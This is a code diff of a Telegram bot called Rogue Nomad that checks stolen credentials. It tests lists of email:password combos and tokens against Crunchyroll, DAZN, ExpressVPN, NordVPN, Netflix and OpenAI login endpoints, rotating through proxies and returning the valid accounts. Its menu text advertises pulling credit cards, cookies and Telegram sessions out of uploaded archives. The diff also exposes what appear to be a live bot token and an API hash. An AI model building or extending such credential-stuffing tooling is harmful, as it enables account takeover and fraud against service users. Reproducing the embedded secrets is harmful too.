@@ -26,11 +26,11 @@ import aiohttp
 import aiosqlite
 
 # ============================================
-# CONFIGURATION - UPDATED WITH YOUR CREDENTIALS
+# CONFIGURATION - YOUR CREDENTIALS
 # ============================================
 BOT_TOKEN = "8651086980:AAFe43rg62NOceSHi-kdb5gbEK5QRqqr09E"
 ADMIN_ID = 1875307475
-CHANNEL_ID = -1003861121732  # Your channel ID
+CHANNEL_ID = -1003861121732
 DATABASE_URL = "rogue_nomad.db"
 LOG_LEVEL = "INFO"
 BOT_LINK = "https://t.me/+ckfO94UHyhllODg0"
@@ -38,10 +38,6 @@ BOT_USERNAME = "@roguenomad_bot"
 BOT_NAME = "Rogue Nomad"
 BOT_VERSION = "v3.0"
 PORT = int(os.environ.get("PORT", 10000))
-
-# ============================================
-# APP CREDENTIALS (for future features)
-# ============================================
 APP_API_ID = 27456172
 APP_API_HASH = "a2e90f559f8ba51bbe424039b98f2ee1"
 
@@ -124,7 +120,6 @@ async def get_db():
 # CHANNEL MEMBERSHIP CHECK
 # ============================================
 async def is_user_in_channel(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> bool:
-    """Check if user is a member of the required channel."""
     try:
         member = await context.bot.get_chat_member(chat_id=CHANNEL_ID, user_id=user_id)
         return member.status in ["member", "administrator", "creator"]
@@ -133,30 +128,19 @@ async def is_user_in_channel(user_id: int, context: ContextTypes.DEFAULT_TYPE) -
         return False
 
 async def check_and_prompt_join(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
-    """Check if user is in channel. If not, prompt them to join."""
     user_id = update.effective_user.id
-    
-    # Admin bypass
     if user_id == ADMIN_ID:
         return True
-    
-    # Check if already verified in this session
     if context.user_data.get("is_verified"):
         return True
-    
-    # Check database for cached membership
     async with get_db() as db:
         cursor = await db.execute("SELECT is_member FROM users WHERE user_id = ?", (user_id,))
         result = await cursor.fetchone()
         if result and result[0] == 1:
             context.user_data["is_verified"] = True
             return True
-    
-    # Check channel membership
     is_member = await is_user_in_channel(user_id, context)
-    
     if is_member:
-        # Update database
         async with get_db() as db:
             await db.execute(
                 "INSERT OR REPLACE INTO users (user_id, is_member, last_active) VALUES (?, 1, CURRENT_TIMESTAMP)",
@@ -166,38 +150,28 @@ async def check_and_prompt_join(update: Update, context: ContextTypes.DEFAULT_TY
         context.user_data["is_verified"] = True
         return True
     
-    # Not a member — prompt to join
     keyboard = [
         [InlineKeyboardButton("🔗 Join Channel", url=BOT_LINK)],
         [InlineKeyboardButton("✅ I've Joined", callback_data="check_membership")],
         [InlineKeyboardButton("💬 Chat Owner", url="https://t.me/RogueNomadSupport")],
     ]
-    
     await update.message.reply_text(
-        f"🚫 *Access Restricted*\n\n"
-        f"To use this bot, you must join our channel first:\n\n"
-        f"🔗 {BOT_LINK}\n\n"
-        f"After joining, click the button below to verify.",
+        "🚫 Access Restricted\n\nTo use this bot, you must join our channel first:\n\n" + BOT_LINK + "\n\nAfter joining, click the button below to verify.",
         reply_markup=InlineKeyboardMarkup(keyboard),
-        parse_mode=ParseMode.MARKDOWN
+        parse_mode=None
     )
     return False
 
 async def check_membership_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle the 'I've Joined' button callback."""
     query = update.callback_query
     await query.answer()
-    
     user_id = update.effective_user.id
-    
     if user_id == ADMIN_ID:
         context.user_data["is_verified"] = True
         await query.edit_message_text("✅ Admin access granted.")
         await show_welcome(update, context)
         return
-    
     is_member = await is_user_in_channel(user_id, context)
-    
     if is_member:
         async with get_db() as db:
             await db.execute(
@@ -210,15 +184,12 @@ async def check_membership_callback(update: Update, context: ContextTypes.DEFAUL
         await show_welcome(update, context)
     else:
         await query.edit_message_text(
-            f"❌ You haven't joined yet.\n\n"
-            f"Please join our channel first:\n"
-            f"🔗 {BOT_LINK}\n\n"
-            f"Then click the button again.",
+            "❌ You haven't joined yet.\n\nPlease join our channel first:\n" + BOT_LINK + "\n\nThen click the button again.",
             reply_markup=InlineKeyboardMarkup([
                 [InlineKeyboardButton("🔗 Join Channel", url=BOT_LINK)],
                 [InlineKeyboardButton("✅ I've Joined", callback_data="check_membership")]
             ]),
-            parse_mode=ParseMode.MARKDOWN
+            parse_mode=None
         )
 
 # ============================================
@@ -233,43 +204,31 @@ class ProxyManager:
     async def get_working_proxies(self) -> List[str]:
         if time.time() - self._cache_time < self._cache_ttl and self._cache:
             return self._cache
-        
         async with get_db() as db:
-            cursor = await db.execute(
-                "SELECT proxy FROM proxies WHERE alive = 1 ORDER BY score DESC LIMIT 500"
-            )
+            cursor = await db.execute("SELECT proxy FROM proxies WHERE alive = 1 ORDER BY score DESC LIMIT 500")
             rows = await cursor.fetchall()
             self._cache = [row[0] for row in rows]
             self._cache_time = time.time()
-            logger.info(f"Loaded {len(self._cache)} working proxies")
             return self._cache
     
     async def get_proxy(self) -> Optional[str]:
         proxies = await self.get_working_proxies()
         if not proxies:
             return None
-        proxy = random.choice(proxies)
-        logger.info(f"Selected proxy: {proxy}")
-        return proxy
+        return random.choice(proxies)
     
     async def add_proxy(self, proxy: str) -> bool:
         proxy = proxy.replace("http://", "").replace("https://", "").strip()
         if not proxy or ":" not in proxy:
             return False
-        
         parts = proxy.split(":")
         if len(parts) not in [2, 4]:
             return False
-        
         try:
             async with get_db() as db:
-                await db.execute(
-                    "INSERT OR IGNORE INTO proxies (proxy) VALUES (?)",
-                    (proxy,)
-                )
+                await db.execute("INSERT OR IGNORE INTO proxies (proxy) VALUES (?)", (proxy,))
                 await db.commit()
                 self._cache = []
-                logger.info(f"Added proxy: {proxy}")
                 return True
         except Exception as e:
             logger.error(f"Error adding proxy {proxy}: {e}")
@@ -282,28 +241,17 @@ class ProxyManager:
             if line and not line.startswith("#"):
                 if await self.add_proxy(line):
                     added += 1
-        logger.info(f"Added {added} proxies from text")
         return added
     
     async def report_result(self, proxy: str, success: bool):
         if not proxy:
             return
-        
         async with get_db() as db:
             if success:
-                await db.execute(
-                    "UPDATE proxies SET score = MIN(100, score + 5), failures = 0 WHERE proxy = ?",
-                    (proxy,)
-                )
+                await db.execute("UPDATE proxies SET score = MIN(100, score + 5), failures = 0 WHERE proxy = ?", (proxy,))
             else:
-                await db.execute(
-                    "UPDATE proxies SET score = MAX(0, score - 10), failures = failures + 1 WHERE proxy = ?",
-                    (proxy,)
-                )
-                await db.execute(
-                    "UPDATE proxies SET alive = 0 WHERE proxy = ? AND failures >= 3",
-                    (proxy,)
-                )
+                await db.execute("UPDATE proxies SET score = MAX(0, score - 10), failures = failures + 1 WHERE proxy = ?", (proxy,))
+                await db.execute("UPDATE proxies SET alive = 0 WHERE proxy = ? AND failures >= 3", (proxy,))
             await db.commit()
             self._cache = []
     
@@ -311,10 +259,7 @@ class ProxyManager:
         async with get_db() as db:
             total = await db.execute_fetchall("SELECT COUNT(*) FROM proxies")
             alive = await db.execute_fetchall("SELECT COUNT(*) FROM proxies WHERE alive = 1")
-            return {
-                "total": total[0][0] if total else 0,
-                "alive": alive[0][0] if alive else 0
-            }
+            return {"total": total[0][0] if total else 0, "alive": alive[0][0] if alive else 0}
     
     async def clear_dead_proxies(self) -> int:
         async with get_db() as db:
@@ -332,15 +277,10 @@ class ServiceCheckers:
     async def check_crunchyroll(email: str, password: str, proxy: Optional[str] = None) -> Dict:
         try:
             async with aiohttp.ClientSession() as session:
-                async with session.get(
-                    "https://www.crunchyroll.com/",
-                    proxy=proxy,
-                    timeout=aiohttp.ClientTimeout(total=10)
-                ) as resp:
+                async with session.get("https://www.crunchyroll.com/", proxy=proxy, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                     html = await resp.text()
                     csrf_match = re.search(r'csrf_token["\s:]+"([^"]+)"', html)
                     csrf = csrf_match.group(1) if csrf_match else ""
-                
                 async with session.post(
                     "https://www.crunchyroll.com/login",
                     data={"email": email, "password": password, "csrf_token": csrf},
@@ -358,16 +298,8 @@ class ServiceCheckers:
     async def check_netflix_token(token: str, proxy: Optional[str] = None) -> Dict:
         try:
             async with aiohttp.ClientSession() as session:
-                headers = {
-                    "Authorization": f"Bearer {token}",
-                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-                }
-                async with session.get(
-                    "https://www.netflix.com/api/shakti/viper/metadata",
-                    headers=headers,
-                    proxy=proxy,
-                    timeout=aiohttp.ClientTimeout(total=10)
-                ) as resp:
+                headers = {"Authorization": f"Bearer {token}", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
+                async with session.get("https://www.netflix.com/api/shakti/viper/metadata", headers=headers, proxy=proxy, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                     if resp.status == 200:
                         return {"valid": True, "status": "active"}
                     return {"valid": False, "status": "expired"}
@@ -378,12 +310,7 @@ class ServiceCheckers:
     async def check_dazn(email: str, password: str, proxy: Optional[str] = None) -> Dict:
         try:
             async with aiohttp.ClientSession() as session:
-                async with session.post(
-                    "https://login.dazn.com/v1/auth/login",
-                    json={"email": email, "password": password},
-                    proxy=proxy,
-                    timeout=aiohttp.ClientTimeout(total=10)
-                ) as resp:
+                async with session.post("https://login.dazn.com/v1/auth/login", json={"email": email, "password": password}, proxy=proxy, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                     if resp.status == 200:
                         data = await resp.json()
                         return {"valid": True, "status": "active", "region": data.get("region", "Unknown")}
@@ -396,12 +323,7 @@ class ServiceCheckers:
         try:
             async with aiohttp.ClientSession() as session:
                 headers = {"Authorization": f"Bearer {token}"}
-                async with session.get(
-                    "https://api.openai.com/v1/models",
-                    headers=headers,
-                    proxy=proxy,
-                    timeout=aiohttp.ClientTimeout(total=10)
-                ) as resp:
+                async with session.get("https://api.openai.com/v1/models", headers=headers, proxy=proxy, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                     if resp.status == 200:
                         return {"valid": True, "status": "active", "tier": "paid"}
                     return {"valid": False, "status": "invalid"}
@@ -412,12 +334,7 @@ class ServiceCheckers:
     async def check_expressvpn(email: str, password: str, proxy: Optional[str] = None) -> Dict:
         try:
             async with aiohttp.ClientSession() as session:
-                async with session.post(
-                    "https://www.expressvpn.com/api/v1/auth/login",
-                    json={"email": email, "password": password},
-                    proxy=proxy,
-                    timeout=aiohttp.ClientTimeout(total=10)
-                ) as resp:
+                async with session.post("https://www.expressvpn.com/api/v1/auth/login", json={"email": email, "password": password}, proxy=proxy, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                     if resp.status == 200:
                         data = await resp.json()
                         return {"valid": True, "status": "active", "plan": data.get("plan", "Unknown")}
@@ -429,12 +346,7 @@ class ServiceCheckers:
     async def check_nordvpn(email: str, password: str, proxy: Optional[str] = None) -> Dict:
         try:
             async with aiohttp.ClientSession() as session:
-                async with session.post(
-                    "https://api.nordvpn.com/v1/users/login",
-                    json={"email": email, "password": password},
-                    proxy=proxy,
-                    timeout=aiohttp.ClientTimeout(total=10)
-                ) as resp:
+                async with session.post("https://api.nordvpn.com/v1/users/login", json={"email": email, "password": password}, proxy=proxy, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                     if resp.status == 200:
                         return {"valid": True, "status": "active"}
                     return {"valid": False, "status": "invalid"}
@@ -474,10 +386,8 @@ class CheckerEngine:
             service_info = self.services.get(service)
             if not service_info:
                 return {"valid": False, "status": "unknown_service"}
-            
             checker = service_info["checker"]
             parsed = self._parse_credential(credential)
-            
             try:
                 result = await checker(**parsed, proxy=proxy)
                 if proxy:
@@ -496,7 +406,6 @@ class CheckerEngine:
         async def limited_check(cred):
             async with sem:
                 return await self.check_single(service, cred, use_proxy, user_id, chat_id)
-        
         tasks = [limited_check(cred) for cred in credentials]
         results = await asyncio.gather(*tasks, return_exceptions=True)
         processed = []
@@ -514,10 +423,7 @@ class CheckerEngine:
                     "INSERT INTO checks (user_id, chat_id, service, credential, valid, status, data, proxy_used) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                     (user_id, chat_id, service, credential, valid, status, data, proxy or "")
                 )
-                await db.execute(
-                    "INSERT OR REPLACE INTO users (user_id, last_active) VALUES (?, CURRENT_TIMESTAMP)",
-                    (user_id,)
-                )
+                await db.execute("INSERT OR REPLACE INTO users (user_id, last_active) VALUES (?, CURRENT_TIMESTAMP)", (user_id,))
                 await db.commit()
         except Exception as e:
             logger.error(f"Failed to log check: {e}")
@@ -544,283 +450,166 @@ proxy_manager = ProxyManager()
 checker_engine = CheckerEngine(proxy_manager)
 
 SERVICE_CATEGORIES = {
-    "📺 Streaming": {
-        "crunchyroll": "🍿 Crunchyroll",
-        "netflix": "📺 Netflix",
-        "dazn": "⚽ DAZN",
-    },
-    "🔒 VPN / Proxy": {
-        "expressvpn": "🔒 ExpressVPN",
-        "nordvpn": "🔐 NordVPN",
-    },
-    "🧠 AI": {
-        "openai": "🧠 OpenAI",
-    }
+    "📺 Streaming": {"crunchyroll": "🍿 Crunchyroll", "netflix": "📺 Netflix", "dazn": "⚽ DAZN"},
+    "🔒 VPN / Proxy": {"expressvpn": "🔒 ExpressVPN", "nordvpn": "🔐 NordVPN"},
+    "🧠 AI": {"openai": "🧠 OpenAI"}
 }
 
 # ============================================
-# WELCOME & COMMANDS
+# WELCOME & COMMANDS (FIXED MARKDOWN)
 # ============================================
 async def show_welcome(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Show welcome menu with transparent overlay style."""
     user = update.effective_user
-    
-    # Build the overlay/transparent menu
     keyboard = [
         [InlineKeyboardButton("👤 Chat Owner", url="https://t.me/RogueNomadSupport")],
         [InlineKeyboardButton("🔗 Join Channel", url=BOT_LINK)],
         [InlineKeyboardButton("🚀 Start Now", callback_data="checkers")],
     ]
-    
-    welcome_text = f"""
-🔥 *{BOT_NAME} {BOT_VERSION}*
-
-*Welcome, {user.first_name or "Butter"}!*
-
-━━━━━━━━━━━━━━━━━━━━━
-📋 *What can this bot do?*
-
-📺 *TV Login*
-Log into Netflix, Crunchyroll, or Surfshark on your TV — just send the 8-digit code shown on screen.
-
-🍿 *NfToken Checker*
-Send Netflix cookies and get back only the working ones with full account capture (plan, country, emails).
-
-🔗 *ULP → Combo*
-Convert URL:Login:Pass combo lists into clean user:pass format instantly.
-
-🍪 *Cookie Checkers*
-Check cookies for 50+ platforms — Netflix, Disney+, Spotify, Amazon Prime, YouTube Premium, Crunchyroll, NordVPN, Surfshark, Deezer, Plex, Chess.com, Patreon, GitHub, Lovable, Replit, Twitch, and many more.
-How to use: Checkers → Cookie Checkers → pick service → upload cookie file → instant results with plan details.
-
-👤 *Account Checkers*
-Check user:pass combos for Netflix, Disney+, Crunchyroll, DAZN, and more.
-How to use: Checkers → Account Checkers → pick service → upload combo list → Alive / Dead results.
-
-📤 *Extract Only*
-Upload any archive (ZIP / RAR / 7z) and extract:
-  🍪 Cookies by domain  |  🔑 Tokens  |  📇 ULP combos
-  💳 Credit Cards  |  📱 Telegram tdata sessions
-
-━━━━━━━━━━━━━━━━━━━━━
-🚫 /cancel — stops any running task at any time.
-
-*Commands:*
-/start - Welcome menu
-/checkers - Show all services
-/proxy - Manage proxies
-/stats - Show statistics
-/help - Help menu
-/about - About Rogue Nomad
-
-*Proxy Management:*
-• Upload a `.txt` file with proxies (one per line)
-• Send: `proxy:host:port`
-• Send: `host:port`
-
-*Support:*
-💬 @roguenomad_bot
-🔗 {BOT_LINK}
-"""
-    
-    await update.message.reply_text(
-        welcome_text,
-        reply_markup=InlineKeyboardMarkup(keyboard),
-        parse_mode=ParseMode.MARKDOWN
+    welcome_text = (
+        "🔥 Rogue Nomad v3.0\n\n"
+        "Welcome, " + (user.first_name or "Butter") + "!\n"
+        "━━━━━━━━━━━━━━━━━━━━━\n"
+        "What can this bot do?\n\n"
+        "TV Login\n"
+        "Log into Netflix, Crunchyroll, or Surfshark on your TV — just send the 8-digit code shown on screen.\n\n"
+        "NfToken Checker\n"
+        "Send Netflix cookies and get back only the working ones with full account capture (plan, country, emails).\n\n"
+        "ULP -> Combo\n"
+        "Convert URL:Login:Pass combo lists into clean user:pass format instantly.\n\n"
+        "Cookie Checkers\n"
+        "Check cookies for 50+ platforms.\n\n"
+        "Account Checkers\n"
+        "Check user:pass combos for Netflix, Disney+, Crunchyroll, DAZN, and more.\n\n"
+        "Extract Only\n"
+        "Upload any archive (ZIP / RAR / 7z) and extract cookies, tokens, combos, credit cards, or Telegram sessions.\n"
+        "━━━━━━━━━━━━━━━━━━━━━\n"
+        "/cancel — stops any running task at any time.\n\n"
+        "Commands:\n"
+        "/start - Welcome menu\n"
+        "/checkers - Show all services\n"
+        "/proxy - Manage proxies\n"
+        "/stats - Show statistics\n"
+        "/help - Help menu\n"
+        "/about - About Rogue Nomad\n\n"
+        "Proxy Management:\n"
+        "• Upload a .txt file with proxies (one per line)\n"
+        "• Send: proxy:host:port\n"
+        "• Send: host:port\n\n"
+        "Support:\n"
+        "💬 @roguenomad_bot\n"
+        "🔗 " + BOT_LINK
     )
+    await update.message.reply_text(welcome_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=None)
 
 # ============================================
 # COMMAND HANDLERS
 # ============================================
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /start command with channel check."""
-    # Check if user is in channel
     if not await check_and_prompt_join(update, context):
         return
-    
     await show_welcome(update, context)
 
 async def checkers_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Show checker categories."""
     if not await check_and_prompt_join(update, context):
         return
-    
     keyboard = []
     for category, services in SERVICE_CATEGORIES.items():
         keyboard.append([InlineKeyboardButton(category, callback_data=f"cat_{category}")])
-    
     keyboard.append([InlineKeyboardButton("📊 Stats", callback_data="show_stats")])
     keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="back_start")])
-    
-    await update.message.reply_text(
-        "🎯 *Select a category:*",
-        reply_markup=InlineKeyboardMarkup(keyboard),
-        parse_mode=ParseMode.MARKDOWN
-    )
+    await update.message.reply_text("🎯 Select a category:", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=None)
 
 async def handle_category(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle category selection."""
     query = update.callback_query
     await query.answer()
-    
     if not await check_and_prompt_join(update, context):
         return
-    
     category = query.data.replace("cat_", "")
     services = SERVICE_CATEGORIES.get(category, {})
-    
     keyboard = []
     for key, label in services.items():
         keyboard.append([InlineKeyboardButton(label, callback_data=f"svc_{key}")])
-    
     keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="checkers")])
-    
-    await query.edit_message_text(
-        f"📋 *{category} Services*\nSelect a service:",
-        reply_markup=InlineKeyboardMarkup(keyboard),
-        parse_mode=ParseMode.MARKDOWN
-    )
+    await query.edit_message_text(f"📋 {category} Services\nSelect a service:", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=None)
 
 async def handle_service_selection(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle service selection."""
     query = update.callback_query
     await query.answer()
-    
     if not await check_and_prompt_join(update, context):
         return
-    
     service = query.data.replace("svc_", "")
     context.user_data["check_service"] = service
     context.user_data["waiting_for_creds"] = True
     context.user_data["use_proxy"] = True
-    
     service_info = checker_engine.services.get(service, {})
     label = service_info.get("label", service)
     cred_type = service_info.get("type", "email:pass or token")
-    
-    # Show proxy count
     proxy_stats = await proxy_manager.get_stats()
-    
     await query.edit_message_text(
-        f"🔍 *Checking {label}*\n\n"
-        f"Send credentials (one per line):\n"
-        f"• `{cred_type}`\n"
-        f"• Or upload a `.txt` file\n\n"
-        f"🌐 Proxy: {'✅ ON' if context.user_data.get('use_proxy', True) else '❌ OFF'}\n"
-        f"📊 Proxies available: `{proxy_stats['alive']}`\n\n"
-        f"*Proxy Management:*\n"
-        f"• Upload a `.txt` file with proxies\n"
-        f"• Send: `proxy:host:port`\n"
-        f"• Send: `host:port`",
-        parse_mode=ParseMode.MARKDOWN,
+        f"🔍 Checking {label}\n\nSend credentials (one per line):\n• {cred_type}\n• Or upload a .txt file\n\n🌐 Proxy: {'ON' if context.user_data.get('use_proxy', True) else 'OFF'}\n📊 Proxies available: {proxy_stats['alive']}\n\nProxy Management:\n• Upload a .txt file with proxies\n• Send: proxy:host:port\n• Send: host:port",
         reply_markup=InlineKeyboardMarkup([
-            [InlineKeyboardButton(
-                f"🌐 Toggle Proxy {'✅' if context.user_data.get('use_proxy', True) else '❌'}",
-                callback_data="toggle_proxy"
-            )],
+            [InlineKeyboardButton(f"🌐 Toggle Proxy {'ON' if context.user_data.get('use_proxy', True) else 'OFF'}", callback_data="toggle_proxy")],
             [InlineKeyboardButton("🔙 Back", callback_data="checkers")]
-        ])
+        ]),
+        parse_mode=None
     )
 
 async def toggle_proxy_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Toggle proxy usage."""
     query = update.callback_query
     await query.answer()
-    
     current = context.user_data.get("use_proxy", True)
     context.user_data["use_proxy"] = not current
-    
-    await query.edit_message_reply_markup(
-        reply_markup=InlineKeyboardMarkup([
-            [InlineKeyboardButton(
-                f"🌐 Toggle Proxy {'✅' if context.user_data['use_proxy'] else '❌'}",
-                callback_data="toggle_proxy"
-            )],
-            [InlineKeyboardButton("🔙 Back", callback_data="checkers")]
-        ])
-    )
+    await query.edit_message_reply_markup(reply_markup=InlineKeyboardMarkup([
+        [InlineKeyboardButton(f"🌐 Toggle Proxy {'ON' if context.user_data['use_proxy'] else 'OFF'}", callback_data="toggle_proxy")],
+        [InlineKeyboardButton("🔙 Back", callback_data="checkers")]
+    ]))
 
 # ============================================
 # PROXY HANDLING
 # ============================================
 async def proxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /proxy command."""
     if not await check_and_prompt_join(update, context):
         return
-    
     proxy_stats = await proxy_manager.get_stats()
-    
     keyboard = [
         [InlineKeyboardButton("📄 Add Proxy File", callback_data="proxy_file")],
         [InlineKeyboardButton("📊 Proxy Stats", callback_data="proxy_stats")],
         [InlineKeyboardButton("🗑️ Clear Dead Proxies", callback_data="proxy_clear")],
         [InlineKeyboardButton("🔙 Back", callback_data="back_start")]
     ]
-    
     await update.message.reply_text(
-        f"🌐 *Proxy Management*\n\n"
-        f"📊 Proxies: `{proxy_stats['alive']}` working / `{proxy_stats['total']}` total\n\n"
-        f"*How to add proxies:*\n"
-        f"• Upload a `.txt` file with proxies (one per line)\n"
-        f"• Send: `proxy:host:port`\n"
-        f"• Send: `host:port`\n\n"
-        f"*Supported formats:*\n"
-        f"• `host:port`\n"
-        f"• `host:port:user:pass`\n"
-        f"• `http://host:port`",
+        f"🌐 Proxy Management\n\n📊 Proxies: {proxy_stats['alive']} working / {proxy_stats['total']} total\n\nHow to add proxies:\n• Upload a .txt file with proxies (one per line)\n• Send: proxy:host:port\n• Send: host:port\n\nSupported formats:\n• host:port\n• host:port:user:pass\n• http://host:port",
         reply_markup=InlineKeyboardMarkup(keyboard),
-        parse_mode=ParseMode.MARKDOWN
+        parse_mode=None
     )
 
 async def handle_proxy_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle proxy file upload or text input."""
     if not await check_and_prompt_join(update, context):
         return
-    
     user = update.effective_user
     text = update.message.text.strip() if update.message.text else ""
     content = ""
-    
     if update.message.document:
         file = await update.message.document.get_file()
         data = await file.download_as_bytearray()
         content = data.decode("utf-8")
-        logger.info(f"User {user.id} uploaded proxy file: {update.message.document.file_name}")
-    
     elif text.startswith("proxy:"):
         content = text.replace("proxy:", "").strip()
-        logger.info(f"User {user.id} sent proxy via text")
-    
     elif ":" in text and not text.startswith("/"):
         content = text
-        logger.info(f"User {user.id} sent single proxy: {text}")
     else:
         return False
-    
     count = await proxy_manager.add_proxies_from_text(content)
     working = len(await proxy_manager.get_working_proxies())
-    
-    await update.message.reply_text(
-        f"✅ *Proxy Import Complete*\n\n"
-        f"Added: `{count}` proxies\n"
-        f"Working: `{working}` proxies\n"
-        f"Use `/proxy` to manage them.",
-        parse_mode=ParseMode.MARKDOWN
-    )
+    await update.message.reply_text(f"✅ Proxy Import Complete\n\nAdded: {count} proxies\nWorking: {working} proxies\nUse /proxy to manage them.", parse_mode=None)
     return True
 
 # ============================================
 # MESSAGE HANDLER
 # ============================================
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle text messages and file uploads."""
-    # First check channel membership (but allow proxy uploads)
     if not await check_and_prompt_join(update, context):
         return
-    
-    user = update.effective_user
-    
-    # --- CHECK FOR PROXY UPLOAD ---
     if update.message.document:
         file_name = update.message.document.file_name or ""
         if file_name.lower().endswith(".txt"):
@@ -828,25 +617,19 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             if handled:
                 return
         else:
-            await update.message.reply_text("📄 Please upload a `.txt` file for proxies or credentials.")
+            await update.message.reply_text("📄 Please upload a .txt file for proxies or credentials.")
             return
-    
-    # --- CHECK FOR TEXT PROXY ---
     if update.message.text:
         text = update.message.text.strip()
         if text.startswith("proxy:") or ("." in text and ":" in text and not text.startswith("/")):
             handled = await handle_proxy_upload(update, context)
             if handled:
                 return
-    
-    # --- IF WAITING FOR CREDENTIALS ---
     if context.user_data.get("waiting_for_creds"):
         service = context.user_data.get("check_service")
         if not service:
             await update.message.reply_text("❌ No service selected. Use /checkers first.")
             return
-        
-        # Process credentials
         if update.message.document:
             file = await update.message.document.get_file()
             content = await file.download_as_bytearray()
@@ -854,26 +637,17 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text(f"📄 Loaded {len(credentials)} credentials from file.")
         else:
             credentials = update.message.text.strip().split("\n")
-        
         credentials = [c.strip() for c in credentials if c.strip()]
         if not credentials:
             await update.message.reply_text("❌ No credentials provided.")
             return
-        
-        status_msg = await update.message.reply_text(
-            f"⏳ Checking {len(credentials)} credentials...",
-            parse_mode=ParseMode.MARKDOWN
-        )
-        
+        status_msg = await update.message.reply_text(f"⏳ Checking {len(credentials)} credentials...", parse_mode=None)
         user_id = update.effective_user.id
         chat_id = update.effective_chat.id
         use_proxy = context.user_data.get("use_proxy", True)
-        
         results = await checker_engine.check_batch(service, credentials, use_proxy, user_id, chat_id)
-        
         valid = [r for r in results if r.get("valid")]
         invalid = [r for r in results if not r.get("valid")]
-        
         if valid:
             output_lines = []
             for i, r in enumerate(valid):
@@ -882,33 +656,15 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             output = "\n".join(output_lines)
             output_file = io.StringIO(output)
             output_file.name = f"valid_{service}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
-            
-            await update.message.reply_document(
-                document=output_file,
-                filename=output_file.name,
-                caption=f"✅ {len(valid)} valid credentials found."
-            )
-        
-        summary = f"""
-📊 *Check Complete*
-Service: `{service}`
-Total: `{len(results)}`
-✅ Valid: `{len(valid)}`
-❌ Invalid: `{len(invalid)}`
-"""
-        await update.message.reply_text(summary, parse_mode=ParseMode.MARKDOWN)
+            await update.message.reply_document(document=output_file, filename=output_file.name, caption=f"✅ {len(valid)} valid credentials found.")
+        summary = f"📊 Check Complete\nService: {service}\nTotal: {len(results)}\n✅ Valid: {len(valid)}\n❌ Invalid: {len(invalid)}"
+        await update.message.reply_text(summary, parse_mode=None)
         await status_msg.delete()
         context.user_data["waiting_for_creds"] = False
         return
-    
-    # --- DEFAULT RESPONSE ---
     await update.message.reply_text(
-        "🤔 I didn't understand that.\n\n"
-        "Try:\n"
-        "• /checkers - Show all services\n"
-        "• /proxy - Manage proxies\n"
-        "• Upload a .txt file with proxies\n"
-        "• Send: proxy:host:port"
+        "🤔 I didn't understand that.\n\nTry:\n• /checkers - Show all services\n• /proxy - Manage proxies\n• Upload a .txt file with proxies\n• Send: proxy:host:port",
+        parse_mode=None
     )
 
 # ============================================
@@ -918,206 +674,37 @@ async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID:
         await update.message.reply_text("❌ Unauthorized.")
         return
-    
     keyboard = [
         [InlineKeyboardButton("📊 Full Stats", callback_data="admin_stats")],
         [InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast")],
         [InlineKeyboardButton("🔄 Reset Stats", callback_data="admin_reset")],
         [InlineKeyboardButton("🔙 Back", callback_data="back_start")]
     ]
-    
-    await update.message.reply_text(
-        "🔐 *Admin Panel*",
-        reply_markup=InlineKeyboardMarkup(keyboard),
-        parse_mode=ParseMode.MARKDOWN
-    )
+    await update.message.reply_text("🔐 Admin Panel", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=None)
 
 async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID:
         await update.message.reply_text("❌ Unauthorized.")
         return
-    
     if not context.args:
         await update.message.reply_text("📢 Usage: /broadcast <message>")
         return
-    
     message = " ".join(context.args)
-    
     async with get_db() as db:
         cursor = await db.execute("SELECT user_id FROM users")
         users = await cursor.fetchall()
-    
     sent = 0
     for user in users:
         try:
-            await context.bot.send_message(
-                chat_id=user[0],
-                text=f"📢 *Broadcast from Admin*\n\n{message}",
-                parse_mode=ParseMode.MARKDOWN
-            )
+            await context.bot.send_message(chat_id=user[0], text=f"📢 Broadcast from Admin\n\n{message}", parse_mode=None)
             sent += 1
             await asyncio.sleep(0.05)
         except:
             pass
-    
-    await update.message.reply_text(f"✅ Broadcast sent to {sent} users.")
+    await update.message.reply_text(f"✅ Broadcast sent to {sent} users.", parse_mode=None)
 
 async def reset_stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID:
         await update.message.reply_text("❌ Unauthorized.")
         return
-    
-    checker_engine.stats = {"total": 0, "valid": 0, "invalid": 0, "errors": 0, "by_service": {}}
-    
-    async with get_db() as db:
-        await db.execute("DELETE FROM checks")
